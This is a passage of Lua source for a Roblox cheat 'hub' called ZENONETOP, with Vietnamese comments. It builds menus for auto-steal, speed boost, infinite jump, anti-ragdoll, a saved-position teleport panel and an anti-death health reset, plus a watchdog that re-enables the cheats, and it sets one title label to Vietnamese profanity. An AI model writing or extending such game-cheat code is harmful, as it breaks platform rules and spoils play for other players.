	_G.ZenonetopSyncAutoSteal = syncSteal
	-- override setAutoSteal (giữ bar + refresh nút mobile)
	local _oldSet = setAutoSteal
	setAutoSteal = function(on)
 St.autoSteal = on and true or false
 autoStealEnabled = St.autoSteal
 if St.autoSteal then
 if type(startAutoSteal) == "function" then pcall(startAutoSteal) end
 else
 if type(stopAutoSteal) == "function" then pcall(stopAutoSteal) end
 end
 syncSteal()
 if _G.ZenonetopRefreshStealBtn then pcall(_G.ZenonetopRefreshStealBtn) end
 if ToggleRefs and ToggleRefs.autoSteal and ToggleRefs.autoSteal.setVisual then
 pcall(ToggleRefs.autoSteal.setVisual, St.autoSteal == true)
 end
 saveCfg()
	end
end)

-- Wallpaper list (ZENONETOP style)
local VIS_WALLS = {
	-- Empire BG only
	"rbxassetid://126832513729779","rbxassetid://81347949983999","rbxassetid://76940707345653",
	"rbxassetid://100648743625857","rbxassetid://73857705647948","rbxassetid://86237559415852",
	"rbxassetid://81474116937197","rbxassetid://86668822094069","rbxassetid://108384375206363",
	"rbxassetid://86791880986403","rbxassetid://126414648469223",
}
St.wallIndex = math.clamp(tonumber(St.wallIndex) or 1, 1, math.max(1, #VIS_WALLS))
task.defer(function()
	if not pageSet then return end
	section(pageSet, "* — WALLPAPER", 25)
	local wr = row(pageSet, 40, 28)
	local img = Instance.new("ImageLabel")
	img.Size = UDim2.new(0, 56, 0, 32)
	img.Position = UDim2.new(0, 8, 0.5, -16)
	img.BackgroundColor3 = C.box
	img.ScaleType = Enum.ScaleType.Crop
	img.Image = VIS_WALLS[St.wallIndex] or VIS_WALLS[1]
	img.ZIndex = 2
	img.Parent = wr
	Instance.new("UICorner", img).CornerRadius = UDim.new(0, 6)
	local idxLbl = Instance.new("TextLabel")
	idxLbl.Size = UDim2.new(0, 48, 0, 20)
	idxLbl.Position = UDim2.new(0, 70, 0.5, -10)
	idxLbl.BackgroundTransparency = 1
	idxLbl.Text = "#" .. tostring(St.wallIndex) .. "/" .. tostring(#VIS_WALLS)
	idxLbl.TextColor3 = C.textDim
	idxLbl.Font = Enum.Font.GothamBold
	idxLbl.TextSize = 11
	idxLbl.ZIndex = 2
	idxLbl.Parent = wr
	local function applyWall()
 local n = #VIS_WALLS
 if n < 1 then return end
 St.wallIndex = ((tonumber(St.wallIndex) or 1) - 1) % n + 1
 local asset = VIS_WALLS[St.wallIndex]
 img.Image = asset
 idxLbl.Text = "#" .. tostring(St.wallIndex) .. "/" .. tostring(n)
 local bg = Main:FindFirstChild("WallBG")
 if not bg then
 bg = Instance.new("ImageLabel")
 bg.Name = "WallBG"
 bg.Size = UDim2.new(1, 0, 1, 0)
 bg.Position = UDim2.new(0, 0, 0, 0)
 bg.BackgroundTransparency = 1
 bg.ScaleType = Enum.ScaleType.Crop
 bg.ZIndex = 0
 bg.Active = false
 bg.Selectable = false
 bg.ZIndex = 0
 bg.Parent = Main
 -- dim overlay for deeper look while keeping UI clickable
 local dim = Instance.new("Frame")
 dim.Name = "WallDim"
 dim.Size = UDim2.new(1, 0, 1, 0)
 dim.BackgroundColor3 = Color3.new(0, 0, 0)
 dim.BackgroundTransparency = 0.45
 dim.BorderSizePixel = 0
 dim.ZIndex = 0
 dim.Active = false
 dim.Selectable = false
 dim.Parent = Main
 Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 12)
 for _, ch in ipairs(Main:GetChildren()) do
 if ch ~= bg and ch.Name ~= "WallDim" and ch:IsA("GuiObject") then
 if ch.ZIndex < 2 then ch.ZIndex = 2 end
 end
 end
 end
 bg.Image = asset
 bg.ImageTransparency = math.clamp(tonumber(St.wallOpacity) or 0.12, 0, 0.85)
 bg.Active = false
 bg.Selectable = false
 bg.ScaleType = Enum.ScaleType.Crop
 bg.Visible = true
 Main.BackgroundTransparency = 0.55
 saveCfg()
	end
	applyWall()
	for i, sign in ipairs({"-", "+"}) do
 local b = Instance.new("TextButton")
 b.Size = UDim2.new(0, 30, 0, 28)
 b.Position = UDim2.new(1, -72 + (i-1)*34, 0.5, -14)
 b.BackgroundColor3 = C.box
 b.Text = sign
 b.TextColor3 = C.text
 b.Font = Enum.Font.GothamBold
 b.TextSize = 16
 b.AutoButtonColor = true
 b.Active = true
 b.ZIndex = 3
 b.Parent = wr
 Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
 local function step()
 local n = #VIS_WALLS
 if n < 1 then return end
 St.wallIndex = (tonumber(St.wallIndex) or 1) + (sign == "+" and 1 or -1)
 if St.wallIndex < 1 then St.wallIndex = n end
 if St.wallIndex > n then St.wallIndex = 1 end
 applyWall()
 end
 b.MouseButton1Click:Connect(step)
 b.Activated:Connect(step)
	end
	-- V3 mode button in auto steal section
	if pagePlayer then
 -- add V3 option note via reusing stealVer
	end
end)

-- Mini = circle combat when closed
task.defer(function()
	local miniGui = PlayerGui:FindFirstChild("ZenonetopHubFullMini")
	local mini = miniGui and miniGui:FindFirstChildWhichIsA("TextButton")
	if mini then
 mini.Size = UDim2.new(0, 110, 0, 36)
 mini.Text = "ZENONETOP"
 mini.TextSize = 22
 local c0 = mini:FindFirstChildOfClass("UICorner")
 if c0 then c0.CornerRadius = UDim.new(0, 8) end
	end
	-- Title bar rectangle text
	local mainGui = PlayerGui:FindFirstChild("ZenonetopHubFullMenu")
	local main = mainGui and mainGui:FindFirstChild("Main")
	if main then
 local top = main:FindFirstChild("TopBar") or main:FindFirstChildWhichIsA("Frame")
 if top then
 for _, x in ipairs(top:GetDescendants()) do
 if x:IsA("TextLabel") and (x.Text:find("VIS") or x.Text:find("Vis")) then
 x.Text = "Free Sell La Tuat Ngu Lon"
 end
 end
 end
	end
end)

-- Watchdog: nếu toggle ON mà logic chết → ON lại
if not _G._VisLogicWatchdog then
	_G._VisLogicWatchdog = true
	task.spawn(function()
 while true do
 task.wait(8)
 pcall(function()
 if St.speedOn then
 local alive = false
 if speedConnection then pcall(function() alive = speedConnection.Connected == true end) end
 if not alive and startSpeedBoost then
 speedConnection = nil
 startSpeedBoost()
 end
 end
 if St.infJump and InfJumpState and not InfJumpState.enabled then
 if startInfJump then startInfJump() end
 end
 if St.antiRagdoll and AntiRagdollV2 and not AntiRagdollV2.Enabled then
 if startAntiRagdoll then startAntiRagdoll() end
 end
 if St.autoSteal and _G.ZenonetopSyncAutoSteal then
 pcall(_G.ZenonetopSyncAutoSteal)
 end
 end)
 end
	end)
end

print("[Free All Gear] Speed | InfJump Empire | RagdollTP | AutoSteal | Wallpaper | Control")


-- Auto-save ALL settings every 3s — mọi vị trí + trạng thái đóng/mở + sizes (không bỏ sót)
task.spawn(function()
	while task.wait(3) do
 pcall(function()
 -- Main menu
 if Main and Main.Parent then
 St._mainPos = {Main.Position.X.Scale, Main.Position.X.Offset, Main.Position.Y.Scale, Main.Position.Y.Offset}
 St.menuOpen = Main.Visible == true
 end
 -- Mini open button
 local miniGui = PlayerGui:FindFirstChild("ZenonetopHubFullMini")
 local mini = miniGui and miniGui:FindFirstChildWhichIsA("TextButton")
 if mini then
 St._miniPos = {mini.Position.X.Scale, mini.Position.X.Offset, mini.Position.Y.Scale, mini.Position.Y.Offset}
 end
 -- Mode bar
 local mb = PlayerGui:FindFirstChild("ZenonetopHubModeBar")
 if mb then
 local f = mb:FindFirstChildWhichIsA("Frame")
 if f then
 St._modeBarPos = {f.Position.X.Scale, f.Position.X.Offset, f.Position.Y.Scale, f.Position.Y.Offset}
 end
 end
 -- Action + Mode buttons: lưu POSITION của Frame holder (A_* / M_*), không phải TextButton
 St._btnPos = St._btnPos or {}
 local function snapHolders(gui)
 if not gui then return end
 for _, holder in ipairs(gui:GetChildren()) do
 if holder:IsA("Frame") or holder:IsA("TextButton") then
 local key = holder.Name
 if key and (key:sub(1,2) == "A_" or key:sub(1,2) == "M_") then
 St._btnPos[key] = {
 holder.Position.X.Scale, holder.Position.X.Offset,
 holder.Position.Y.Scale, holder.Position.Y.Offset,
 holder.Size.X.Offset, holder.Size.Y.Offset
 }
 end
 end
 end
 end
 snapHolders(PlayerGui:FindFirstChild("ZenonetopHubActionButtons"))
 snapHolders(PlayerGui:FindFirstChild("ZenonetopHubModeBar"))
 -- Panel TP
 local tp = PlayerGui:FindFirstChild("ZenonetopHubbTP")
 if tp then
 local m = tp:FindFirstChild("TPMain")
 if m then
 St._tpMainPos = {m.Position.X.Scale, m.Position.X.Offset, m.Position.Y.Scale, m.Position.Y.Offset}
 St._tpMinimized = (m.Size.Y.Offset or 0) < 120
 end
 end
 -- Auto Steal floating GUI pos if any
 local asg = PlayerGui:FindFirstChild("ZenonetopAutoStealGui")
 if asg then
 local mf = asg:FindFirstChildWhichIsA("Frame")
 if mf then
 St._stealGuiPos = {mf.Position.X.Scale, mf.Position.X.Offset, mf.Position.Y.Scale, mf.Position.Y.Offset}
 end
 end
 saveCfg() -- dump toàn bộ St
 end)
	end
end)

-- restore positions on load
task.defer(function()
	pcall(function()
 if St._mainPos and Main then
 Main.Position = UDim2.new(St._mainPos[1], St._mainPos[2], St._mainPos[3], St._mainPos[4])
 end
 local miniGui = PlayerGui:FindFirstChild("ZenonetopHubFullMini")
 local mini = miniGui and miniGui:FindFirstChildWhichIsA("TextButton")
 if mini and St._miniPos then
 mini.Position = UDim2.new(St._miniPos[1], St._miniPos[2], St._miniPos[3], St._miniPos[4])
 end
	end)
end)

task.defer(function()
	if St.menuOpen == false then
 pcall(function()
 Main.Visible = false
 Mini.Visible = true
 end)
	end
end)

task.defer(function()
	if not pageSet then return end
	section(pageSet, "* — SENTRY BUTTON SIZE", 28)
	local sr = row(pageSet, 36, 29)
	local lbl = Instance.new("TextLabel")
	lbl.Size = UDim2.new(0.5, 0, 1, 0)
	lbl.BackgroundTransparency = 1
	lbl.Text = "Sentry size"
	lbl.TextColor3 = C.text
	lbl.Font = Enum.Font.Gotham
	lbl.TextSize = 12
	lbl.TextXAlignment = Enum.TextXAlignment.Left
	lbl.Position = UDim2.new(0, 8, 0, 0)
	lbl.Parent = sr
	local val = Instance.new("TextLabel")
	val.Size = UDim2.new(0, 40, 1, 0)
	val.Position = UDim2.new(1, -110, 0, 0)
	val.BackgroundTransparency = 1
	val.Text = tostring(St.btnSizes.sentry or 50)
	val.TextColor3 = C.textDim
	val.Font = Enum.Font.GothamBold
	val.Parent = sr
	for i, sign in ipairs({"-", "+"}) do
 local b = Instance.new("TextButton")
 b.Size = UDim2.new(0, 28, 0, 28)
 b.Position = UDim2.new(1, -70 + (i-1)*32, 0.5, -14)
 b.BackgroundColor3 = C.box
 b.Text = sign
 b.TextColor3 = C.text
 b.Font = Enum.Font.GothamBold
 b.Parent = sr
 Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
 b.MouseButton1Click:Connect(function()
 local cur = tonumber(St.btnSizes.sentry) or 50
 cur = math.clamp(cur + (sign == "+" and 5 or -5), 20, 200)
 St.btnSizes.sentry = cur
 val.Text = tostring(cur)
 if _G.ZenonetopUpdateMobileVisuals then
 pcall(_G.ZenonetopUpdateMobileVisuals)
 elseif _G.ZenonetopApplyMobile then
 pcall(_G.ZenonetopApplyMobile)
 end
 saveCfg()
 end)
	end
end)


-- ============================================================
-- PANEL TP STANDALONE (compact + rainbow border + markers)
-- ============================================================
task.spawn(function()
	local SAVE_BASE, SAVE_PET = nil, nil
	local function toVec(t)
 if typeof(t) == "Vector3" then return t end
 if type(t) == "table" then
 local x,y,z = tonumber(t[1]) or tonumber(t.X), tonumber(t[2]) or tonumber(t.Y), tonumber(t[3]) or tonumber(t.Z)
 if x and y and z then return Vector3.new(x,y,z) end
 end
 return nil
	end
	-- No nhớ base/pet giữa session — chỉ panel position
	SAVE_BASE = nil
	SAVE_PET = nil
	St._saveBase = nil
	St._savePet = nil
	print("[TP] base/pet memory disabled (panel pos only)")
	local DELAY_BASE = tonumber(St._delayBase) or 0.15
	local DELAY_PET = tonumber(St._delayPet) or 0.15
	local KEYBIND_TP = Enum.KeyCode.X
	St._keyTP = "X"
	local IS_TPING, panelLocked, MINIMIZE = false, false, St._tpMinimized == true
	local MARK_BASE, MARK_PET = nil, nil

	local function Marker(pos, col)
 local p = Instance.new("Part")
 p.Name = "ZenonetopTP_Marker"
 p.Shape = Enum.PartType.Cylinder
 p.Size = Vector3.new(0.35, 4, 4)
 p.CFrame = CFrame.new(pos + Vector3.new(0, 0.2, 0)) * CFrame.Angles(0, 0, math.rad(90))
 p.Anchored = true
 p.CanCollide = false
 p.Material = Enum.Material.Neon
 p.Color = col
 p.Transparency = 0.15
 p.Parent = workspace
 -- ring spin light
 local light = Instance.new("PointLight", p)
 light.Color = col
 light.Brightness = 2
 light.Range = 10
 return p
	end
	local function clearMark(m)
 if m then pcall(function() m:Destroy() end) end
	end

	local function SmoothTP(hrp, pos)
 if not hrp or not pos then return end
 pcall(function()
 hrp.AssemblyLinearVelocity = Vector3.zero
 hrp.CFrame = CFrame.new(pos + Vector3.new(0, 3, 0))
 end)
	end
	local _chilliAntiDieToken = 0
	local function enableChilliAntiDie(hum, char, duration)
	    if not hum or not char then return function() end end
	    _chilliAntiDieToken = _chilliAntiDieToken + 1
	    local myToken = _chilliAntiDieToken
	    local conns = {}
	
	    pcall(function()
	        hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
	    end)
	
	    table.insert(conns, hum:GetPropertyChangedSignal("Health"):Connect(function()
	        if myToken ~= _chilliAntiDieToken then return end
	        if hum and hum.Parent and hum.Health < hum.MaxHealth then
	            pcall(function() hum.Health = hum.MaxHealth end)
	        end
	    end))
	
	    local function onDied()
	        if myToken ~= _chilliAntiDieToken then return end
	        task.defer(function()
	            if myToken ~= _chilliAntiDieToken then return end
	            if hum and hum.Parent then
	                pcall(function()
	                    hum.Health = hum.MaxHealth
	                    hum:ChangeState(Enum.HumanoidStateType.Running)
	                end)
	            end
	        end)
	    end
	    table.insert(conns, hum.Died:Connect(onDied))
	
	    pcall(function()
	        if char:GetAttribute("BreakJoints") ~= nil then
	            char:SetAttribute("BreakJoints", false)
	        end
	    end)
	
	    local function disable()
	        if myToken ~= _chilliAntiDieToken then return end
	        _chilliAntiDieToken = _chilliAntiDieToken + 1
	        for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
	        pcall(function()
	            if hum and hum.Parent then
	                hum:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
	            end
	        end)
	    end
	
	    if duration and duration > 0 then
	        task.delay(duration, disable)
	    end
	    return disable
	end
	
	local function getLandPos(targetPos, char, hrp, hum)
	    local landY = targetPos.Y
	    pcall(function()
	        local ignore = {char}
	        for _, p in ipairs(workspace:GetChildren()) do
	            if p.Name == "SavePoint" then table.insert(ignore, p) end
	        end
	        local rayParams = RaycastParams.new()
	        rayParams.FilterDescendantsInstances = ignore
	        rayParams.FilterType = Enum.RaycastFilterType.Exclude
	        local origin = Vector3.new(targetPos.X, math.max(targetPos.Y, 0) + 100, targetPos.Z)
	        local hit = workspace:Raycast(origin, Vector3.new(0, -400, 0), rayParams)
	        if hit then
	            local offset = (hum and hum.HipHeight or 2) + ((hrp and hrp.Size.Y or 2) / 2)
	            landY = hit.Position.Y + offset
	        end
	    end)
	    return Vector3.new(targetPos.X, landY, targetPos.Z)
	end
	
	
	local function ChilliDrop(hrp, targetPos, char)
    if not hrp or not targetPos then return end
    char = char or LP.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum or hum.Health <= 0 then return end

    enableChilliAntiDie(hum, char, 1.2)
    pcall(function() hum.Health = hum.MaxHealth end)

    EquipFly(char)
    task.wait(0.02)

    local function stopVel()
        pcall(function()
            hrp.AssemblyLinearVelocity = Vector3.zero
            hrp.AssemblyAngularVelocity = Vector3.zero
        end)
    end

    -- 1) NHẤC BỔNG NHANH (Ace drop ascend rút ngắn)
    local ASCEND_DUR = 0.08
    local ASCEND_SPD = 180
    local t0 = tick()
    while tick() - t0 < ASCEND_DUR do
        if not hrp or not hrp.Parent then return end
        pcall(function()
            local v = hrp.AssemblyLinearVelocity
            hrp.AssemblyLinearVelocity = Vector3.new(v.X, ASCEND_SPD, v.Z)
        end)
        RS.Heartbeat:Wait()
    end

    -- 2) BAY THẲNG QUA điểm save (CFrame 1 lần, cao vừa để drop nhanh)
    local airY = targetPos.Y + 16
    stopVel()
    pcall(function()
        hrp.CFrame = CFrame.new(targetPos.X, airY, targetPos.Z)
        hrp.AssemblyLinearVelocity = Vector3.new(0, -200, 0) -- bắt đầu đập ngay
    end)

    -- 3) DROP ĐẬP ĐẤT NGAY như Ace (raycast + snap, chờ tối đa rất ngắn)
    local landY = targetPos.Y
    pcall(function()
        local ignore = {char}
        for _, p in ipairs(workspace:GetChildren()) do
            if p.Name == "SavePoint" then table.insert(ignore, p) end
        end
        local rayParams = RaycastParams.new()
        rayParams.FilterDescendantsInstances = ignore
        rayParams.FilterType = Enum.RaycastFilterType.Exclude
        local origin = Vector3.new(targetPos.X, airY + 5, targetPos.Z)
        local hit = workspace:Raycast(origin, Vector3.new(0, -400, 0), rayParams)
        if hit then
            local offset = (hum.HipHeight or 2) + (hrp.Size.Y / 2)
            landY = hit.Position.Y + offset
        end
    end)
    local landPos = Vector3.new(targetPos.X, landY, targetPos.Z)

    -- Chỉ chờ 1–2 frame rơi rồi snap (nhanh như Ace drop)
    local fallT = tick()
    while tick() - fallT < 0.10 do
        if not hrp or not hrp.Parent then break end
        if hrp.Position.Y <= landY + 6 then break end
        pcall(function()
            hrp.AssemblyLinearVelocity = Vector3.new(0, -220, 0)
        end)
        RS.Heartbeat:Wait()
    end

    pcall(function()
        hrp.CFrame = CFrame.new(landPos)
        hrp.AssemblyLinearVelocity = Vector3.zero
        hrp.AssemblyAngularVelocity = Vector3.zero
    end)
    stopVel()

    pcall(function()
        hum.Sit = false
        hum.PlatformStand = false
        hum.AutoRotate = true
        hum.Health = hum.MaxHealth
        hum:ChangeState(Enum.HumanoidStateType.Running)
    end)
    pcall(function()
        local cam = workspace.CurrentCamera
        local h = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
        if cam and h then cam.CameraSubject = h end
    end)
	end
	local function EquipFly(char)
 char = char or LP.Character
 local hum = char and char:FindFirstChildOfClass("Humanoid")
 if not hum then return end
 for _, n in ipairs({"Flying Carpet", "Carpet", "Witch's Broom", "Cloud"}) do
 local t = char:FindFirstChild(n) or LP.Backpack:FindFirstChild(n)
 if t and t:IsA("Tool") then pcall(function() hum:EquipTool(t) end) return end
 end
	end

	-- restore markers
	if SAVE_BASE then MARK_BASE = Marker(SAVE_BASE, Color3.fromRGB(255, 105, 180)) end
	if SAVE_PET then MARK_PET = Marker(SAVE_PET, Color3.fromRGB(255, 140, 0)) end

	pcall(function()
 local old = PlayerGui:FindFirstChild("ZenonetopHubbTP")
 if old then old:Destroy() end
	end)
	local gui = Instance.new("ScreenGui")
	gui.Name = "ZenonetopHubbTP"
	gui.ResetOnSpawn = false
	gui.IgnoreGuiInset = true
	gui.DisplayOrder = 80
	gui.Enabled = (St.showTPPanel ~= false)
	gui.Parent = PlayerGui

	local Main = Instance.new("Frame")
	Main.Name = "TPMain"
	Main.Size = UDim2.new(0, 210, 0, 268)
	Main.Position = UDim2.new(0.02, 0, 0.28, 0)
	if type(St._tpMainPos) == "table" then
 Main.Position = UDim2.new(St._tpMainPos[1], St._tpMainPos[2], St._tpMainPos[3], St._tpMainPos[4])
	end
	Main.BackgroundColor3 = Color3.fromRGB(14, 14, 20)
	Main.BorderSizePixel = 0
	Main.Active = true
	Main.ClipsDescendants = true
	Main.Parent = gui
	Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 12)

	-- rainbow 7-color stroke
	local stroke = Instance.new("UIStroke", Main)
	stroke.Thickness = 2.2
	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	local rainbow = {
 Color3.fromRGB(255, 0, 80),
 Color3.fromRGB(255, 120, 0),
 Color3.fromRGB(255, 220, 0),
 Color3.fromRGB(40, 220, 80),
 Color3.fromRGB(40, 180, 255),
 Color3.fromRGB(120, 80, 255),
 Color3.fromRGB(255, 60, 200),
	}
	task.spawn(function()
 local i = 1
 while Main and Main.Parent do
 stroke.Color = rainbow[i]
 i = i % #rainbow + 1
 task.wait(0.12)
 end
	end)

	-- header row
	local ROW = 30
	local PAD = 8
	local function y(i) return 6 + (i - 1) * (ROW + 4) end

	local LockBtn = Instance.new("TextButton", Main)
	LockBtn.Size = UDim2.new(0, 54, 0, 24)
	LockBtn.Position = UDim2.new(0, PAD, 0, y(1))
	LockBtn.BackgroundColor3 = Color3.fromRGB(32, 32, 44)
	LockBtn.Text = "UNLOCK"
	LockBtn.TextColor3 = Color3.new(1,1,1)
	LockBtn.Font = Enum.Font.GothamBold
	LockBtn.TextSize = 10
	Instance.new("UICorner", LockBtn).CornerRadius = UDim.new(0, 6)

	local title = Instance.new("TextLabel", Main)
	title.Size = UDim2.new(1, -100, 0, 24)
	title.Position = UDim2.new(0, 64, 0, y(1))
	title.BackgroundTransparency = 1
	title.Text = "ZENONETOP TP"
	title.TextColor3 = Color3.fromRGB(230, 210, 255)
	title.Font = Enum.Font.GothamBold
	title.TextSize = 13
	title.TextXAlignment = Enum.TextXAlignment.Left

	local CloseBtn = Instance.new("TextButton", Main)
	CloseBtn.Size = UDim2.new(0, 26, 0, 24)
	CloseBtn.Position = UDim2.new(1, -34, 0, y(1))
	CloseBtn.BackgroundColor3 = Color3.fromRGB(32, 32, 44)
	CloseBtn.Text = MINIMIZE and "+" or "−"
	CloseBtn.TextColor3 = Color3.new(1,1,1)
	CloseBtn.Font = Enum.Font.GothamBold
	CloseBtn.TextSize = 16
	Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 6)

	local body = Instance.new("Frame", Main)
	body.Name = "Body"
	body.Size = UDim2.new(1, -16, 0, 190)
	body.Position = UDim2.new(0, PAD, 0, y(2))
	body.BackgroundTransparency = 1
	body.Visible = not MINIMIZE

	local function mkBtn(text, row, col)
 local b = Instance.new("TextButton", body)
 b.Size = UDim2.new(1, 0, 0, ROW)
 b.Position = UDim2.new(0, 0, 0, (row - 1) * (ROW + 4))
 b.BackgroundColor3 = col
 b.Text = text
 b.TextColor3 = Color3.new(1,1,1)
 b.Font = Enum.Font.GothamBold
 b.TextSize = 12
 Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
 return b
	end
	local function mkLabel(text, row)
 local l = Instance.new("TextLabel", body)
 l.Size = UDim2.new(1, -64, 0, ROW)
 l.Position = UDim2.new(0, 0, 0, (row - 1) * (ROW + 4))
 l.BackgroundTransparency = 1
 l.Text = text
 l.TextColor3 = Color3.fromRGB(180, 180, 200)
 l.Font = Enum.Font.Gotham
 l.TextSize = 11
 l.TextXAlignment = Enum.TextXAlignment.Left
 return l
	end
	local function mkAdj(row, onMinus, onPlus)
 for i, s in ipairs({"-", "+"}) do
 local b = Instance.new("TextButton", body)
 b.Size = UDim2.new(0, 28, 0, 26)
 b.Position = UDim2.new(1, -60 + (i - 1) * 30, 0, (row - 1) * (ROW + 4) + 2)
 b.BackgroundColor3 = Color3.fromRGB(36, 36, 50)
 b.Text = s
 b.TextColor3 = Color3.new(1,1,1)
 b.Font = Enum.Font.GothamBold
 b.TextSize = 14
 Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
 b.MouseButton1Click:Connect(s == "-" and onMinus or onPlus)
 end
	end

	local BtnSaveBase = mkBtn("Luu Base", 1, Color3.fromRGB(110, 70, 190))
	local BtnSavePet = mkBtn("Luu Pet", 2, Color3.fromRGB(210, 110, 40))
	local LblBase = mkLabel("Base: " .. string.format("%.2f", DELAY_BASE) .. "s", 3)
	local LblPet = mkLabel("Pet: " .. string.format("%.2f", DELAY_PET) .. "s", 4)
	mkAdj(3, function()
 DELAY_BASE = math.clamp(DELAY_BASE - 0.01, 0.01, 2)
 St._delayBase = DELAY_BASE
 LblBase.Text = "Base: " .. string.format("%.2f", DELAY_BASE) .. "s"
 saveCfg()
	end, function()
 DELAY_BASE = math.clamp(DELAY_BASE + 0.01, 0.01, 2)
 St._delayBase = DELAY_BASE
 LblBase.Text = "Base: " .. string.format("%.2f", DELAY_BASE) .. "s"
 saveCfg()
	end)
	mkAdj(4, function()
 DELAY_PET = math.clamp(DELAY_PET - 0.01, 0.01, 2)
 St._delayPet = DELAY_PET
 LblPet.Text = "Pet: " .. string.format("%.2f", DELAY_PET) .. "s"
 saveCfg()
	end, function()
 DELAY_PET = math.clamp(DELAY_PET + 0.01, 0.01, 2)
 St._delayPet = DELAY_PET
 LblPet.Text = "Pet: " .. string.format("%.2f", DELAY_PET) .. "s"
 saveCfg()
	end)

	local BtnKey = mkBtn("PHIM: [X]", 5, Color3.fromRGB(45, 45, 60))
	local settingKey = false
	BtnKey.MouseButton1Click:Connect(function()
 settingKey = true
 BtnKey.Text = "Nhan phim..."
	end)

	local BtnTP = Instance.new("TextButton", Main)
	BtnTP.Size = UDim2.new(1, -16, 0, 36)
	BtnTP.Position = UDim2.new(0, PAD, 1, -44)
	BtnTP.BackgroundColor3 = Color3.fromRGB(140, 90, 255)
	BtnTP.Text = "TP [X]"
	BtnTP.TextColor3 = Color3.new(1,1,1)
	BtnTP.Font = Enum.Font.GothamBlack
	BtnTP.TextSize = 14
	Instance.new("UICorner", BtnTP).CornerRadius = UDim.new(0, 10)

	if MINIMIZE then
 Main.Size = UDim2.new(0, 180, 0, 82)
 BtnTP.Position = UDim2.new(0, PAD, 0, 38)
 body.Visible = false
	end

	BtnSaveBase.MouseButton1Click:Connect(function()
 local h = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
 if not h then return end
 SAVE_BASE = h.Position
 St._saveBase = {SAVE_BASE.X, SAVE_BASE.Y, SAVE_BASE.Z}
 clearMark(MARK_BASE)
 MARK_BASE = Marker(SAVE_BASE, Color3.fromRGB(255, 105, 180))
 saveCfg()
 BtnSaveBase.Text = "Da luu Base"
 task.delay(0.7, function() BtnSaveBase.Text = "Luu Base" end)
	end)
	BtnSavePet.MouseButton1Click:Connect(function()
 local h = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
 if not h then return end
 SAVE_PET = h.Position
 St._savePet = {SAVE_PET.X, SAVE_PET.Y, SAVE_PET.Z}
 clearMark(MARK_PET)
 MARK_PET = Marker(SAVE_PET, Color3.fromRGB(255, 140, 0))
 saveCfg()
 BtnSavePet.Text = "Da luu Pet"
 task.delay(0.7, function() BtnSavePet.Text = "Luu Pet" end)
	end)

	local function StartTP()
 if IS_TPING or settingKey then return end
 -- re-read from St in case table updated
 SAVE_BASE = toVec(St._saveBase) or SAVE_BASE
 SAVE_PET = toVec(St._savePet) or SAVE_PET
 task.spawn(function()
 local C0 = LP.Character
 local HRP = C0 and C0:FindFirstChild("HumanoidRootPart")
 if not HRP then
 BtnTP.Text = "No character"
 task.wait(0.8)
 BtnTP.Text = "TP [" .. KEYBIND_TP.Name .. "]"
 return
 end
 if not SAVE_BASE and not SAVE_PET then
 BtnTP.Text = "Chua luu diem"
 task.wait(0.9)
 BtnTP.Text = "TP [" .. KEYBIND_TP.Name .. "]"
 return
 end
 IS_TPING = true
 BtnTP.Text = "Dang TP..."
 local ok, err = pcall(function()
 if (SAVE_BASE and not SAVE_PET) or (SAVE_PET and not SAVE_BASE) then
 ChilliDrop(HRP, SAVE_BASE or SAVE_PET, C0)
 else
 EquipFly(C0)
 SmoothTP(HRP, SAVE_BASE)
 task.wait(tonumber(DELAY_BASE) or 0.15)
 C0 = LP.Character or C0
 HRP = C0 and C0:FindFirstChild("HumanoidRootPart") or HRP
 if HRP and SAVE_PET then SmoothTP(HRP, SAVE_PET) end
 end
 end)
 if not ok then
 warn("[TP] error:", err)
 BtnTP.Text = "Loi TP"
 task.wait(0.8)
 end
 IS_TPING = false
 BtnTP.Text = "TP [" .. KEYBIND_TP.Name .. "]"
 end)
	end
	BtnTP.MouseButton1Click:Connect(StartTP)

	LockBtn.MouseButton1Click:Connect(function()
 panelLocked = not panelLocked
 LockBtn.Text = panelLocked and "LOCK" or "UNLOCK"
 LockBtn.BackgroundColor3 = panelLocked and Color3.fromRGB(160, 50, 70) or Color3.fromRGB(32, 32, 44)
 saveCfg()
	end)
	CloseBtn.MouseButton1Click:Connect(function()
 MINIMIZE = not MINIMIZE
 St._tpMinimized = MINIMIZE
 body.Visible = not MINIMIZE
 if MINIMIZE then
 Main.Size = UDim2.new(0, 180, 0, 82)
 BtnTP.Position = UDim2.new(0, PAD, 0, 38)
 CloseBtn.Text = "+"
 else
 Main.Size = UDim2.new(0, 210, 0, 268)
 BtnTP.Position = UDim2.new(0, PAD, 1, -44)
 CloseBtn.Text = "−"
 end
 saveCfg()
	end)

	do
 local dragging, dragStart, startPos
 Main.InputBegan:Connect(function(input)
 if panelLocked then return end
 if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 dragging = true
 dragStart = input.Position
 startPos = Main.Position
 input.Changed:Connect(function()
 if input.UserInputState == Enum.UserInputState.End then
 dragging = false
 St._tpMainPos = {Main.Position.X.Scale, Main.Position.X.Offset, Main.Position.Y.Scale, Main.Position.Y.Offset}
 saveCfg()
 end
 end)
 end
 end)
 UIS.InputChanged:Connect(function(input)
 if not dragging or panelLocked then return end
 if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
 local d = input.Position - dragStart
 Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
 end
 end)
	end

	UIS.InputBegan:Connect(function(input, gp)
 if gp then return end
 if settingKey and input.UserInputType == Enum.UserInputType.Keyboard then
 KEYBIND_TP = input.KeyCode
 St._keyTP = KEYBIND_TP.Name
 settingKey = false
